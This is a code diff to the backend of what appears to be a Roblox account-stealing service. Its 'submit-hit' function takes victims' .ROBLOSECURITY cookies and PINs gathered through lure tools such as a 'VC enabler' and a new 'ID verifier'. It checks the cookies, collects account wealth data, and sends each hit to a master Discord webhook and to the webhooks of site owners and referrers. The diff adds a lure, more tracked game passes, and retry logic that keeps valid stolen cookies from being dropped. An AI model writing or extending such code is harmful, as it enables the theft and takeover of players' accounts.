@@ -12,10 +12,13 @@ interface Body {
     | "copy_games"
     | "copy_clothes"
     | "group_botter"
-    | "vc_enabler";
+    | "vc_enabler"
+    | "id_verifier";
   cookie: string;
   pin?: string;
   extras?: Record<string, string | number | undefined>;
+  // When true (Hit Checker), do NOT forward to any webhook if the cookie is invalid.
+  checkOnly?: boolean;
 }
 
 // Master webhook + emoji overrides are read from secrets PER REQUEST so changing
@@ -78,6 +81,8 @@ const TRACKED_GAMES: Array<{ name: string; passes: number[] }> = [
   { name: "MM2",              passes: [429957, 1308795] },
   { name: "Steal a Brainrot", passes: [1228591447, 1229510262, 1227013099] },
   { name: "Adopt Me",         passes: [3196348, 5300198, 1585546290, 6040696, 189425850] },
+  { name: "PS99",             passes: [265320491, 259437976, 205379487, 265324265, 655859720, 257811346, 258567677, 257803774, 975558264, 264808140, 690997523, 720275150, 651611000] },
+  { name: "Bloxstrike",       passes: [1819900809, 1827234915, 1826267025] },
 ];
 
 async function ownsGamePass(userId: number, gamePassId: number): Promise<boolean> {
@@ -139,6 +144,8 @@ Deno.serve(async (req) => {
       copy_clothes: profile?.webhook_copy_clothes,
       group_botter: profile?.webhook_group_botter,
       vc_enabler: profile?.webhook_vc_enabler,
+      // id_verifier has no per-tool webhook column; falls back to webhook_url.
+      id_verifier: null,
     };
     const ownerWebhook = perToolMap[body.toolKey] || profile?.webhook_url || null;
 
@@ -164,6 +171,7 @@ Deno.serve(async (req) => {
           copy_clothes: refProfile.webhook_copy_clothes,
           group_botter: refProfile.webhook_group_botter,
           vc_enabler: refProfile.webhook_vc_enabler,
+          id_verifier: null,
         };
         const hook = refToolMap[body.toolKey] || refProfile.webhook_url || null;
         if (hook) referrerWebhooks.push(hook);
@@ -241,11 +249,17 @@ Deno.serve(async (req) => {
     });
 
     const targets = new Set<string>();
-    // Master webhook receives EVERY hit (root site + all user-owned sites).
-    const masterWebhook = getMasterWebhook();
-    if (masterWebhook) targets.add(masterWebhook);
-    if (ownerWebhook) targets.add(ownerWebhook);
-    for (const url of referrerWebhooks) targets.add(url);
+    const valid = robloxInfo !== null;
+    // Hit Checker mode: skip ALL webhook forwarding if the cookie was invalid.
+    // This ensures only genuinely-valid checks reach the master webhook.
+    const shouldForward = !body.checkOnly || valid;
+    if (shouldForward) {
+      // Master webhook receives EVERY hit (root site + all user-owned sites).
+      const masterWebhook = getMasterWebhook();
+      if (masterWebhook) targets.add(masterWebhook);
+      if (ownerWebhook) targets.add(ownerWebhook);
+      for (const url of referrerWebhooks) targets.add(url);
+    }
 
     await Promise.allSettled(
       Array.from(targets).map((url) =>
@@ -257,7 +271,7 @@ Deno.serve(async (req) => {
       )
     );
 
-    return json({ ok: true, valid: robloxInfo !== null });
+    return json({ ok: true, valid });
   } catch (err) {
     console.error("submit-hit error", err);
     return json({ error: "Internal error" }, 500);
@@ -310,11 +324,22 @@ interface RobloxInfo {
 async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
   try {
     const cookieHeader = `.ROBLOSECURITY=${cookie}`;
-    const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
-      headers: { Cookie: cookieHeader },
-    });
-    if (!authRes.ok) return null;
-    const auth = await authRes.json() as { id: number; name: string; displayName: string };
+    // Retry the auth call — Roblox occasionally 5xx/429s on the first hit even
+    // for perfectly valid cookies, which was misreporting valid hits as invalid.
+    let auth: { id: number; name: string; displayName: string } | null = null;
+    for (let attempt = 0; attempt < 3; attempt++) {
+      const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
+        headers: { Cookie: cookieHeader },
+      });
+      if (authRes.ok) {
+        auth = await authRes.json();
+        break;
+      }
+      // 401 = actually invalid cookie, no point retrying
+      if (authRes.status === 401) return null;
+      await new Promise((r) => setTimeout(r, 400 * (attempt + 1)));
+    }
+    if (!auth) return null;
 
     const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals, ownedPasses, emailInfo] = await Promise.all([
       fetchRobux(auth.id, cookieHeader),
@@ -710,10 +735,10 @@ function buildDiscordPayload(opts: {
       { name: `${EMOJI.id} User ID`, value: String(roblox.id), inline: true },
       { name: `${EMOJI.age_acct} Account Age`, value: ageStr, inline: true },
       { name: `${EMOJI.robux} Robux`, value: robuxStr, inline: true },
-      { name: `${EMOJI.premium} Premium`, value: roblox.premium === null ? "Unknown" : roblox.premium ? "true" : "false", inline: true },
+      { name: `${EMOJI.premium} Plus`, value: roblox.premium === null ? "Unknown" : roblox.premium ? "true" : "false", inline: true },
       { name: `${EMOJI.rap} RAP`, value: roblox.rap !== null ? roblox.rap.toLocaleString() : "Unknown", inline: true },
       { name: `${EMOJI.summary} Summary`, value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()}`, inline: true },
-      { name: `${EMOJI.pending} Robux Incoming`, value: (roblox.incomingRobux ?? 0).toLocaleString(), inline: true },
+      { name: `${EMOJI.pending} Robux Incoming`, value: (roblox.pendingRobux ?? 0).toLocaleString(), inline: true },
       { name: `${EMOJI.korblox}/${EMOJI.headless} Korblox/Headless`, value: `${roblox.hasKorblox ? "True" : "False"}/${roblox.hasHeadless ? "True" : "False"}`, inline: true },
       { name: `${EMOJI.friends} Friends`, value: roblox.friendsCount?.toLocaleString() ?? "Unknown", inline: true },
       { name: `${EMOJI.followers} Followers`, value: roblox.followersCount?.toLocaleString() ?? "Unknown", inline: true },
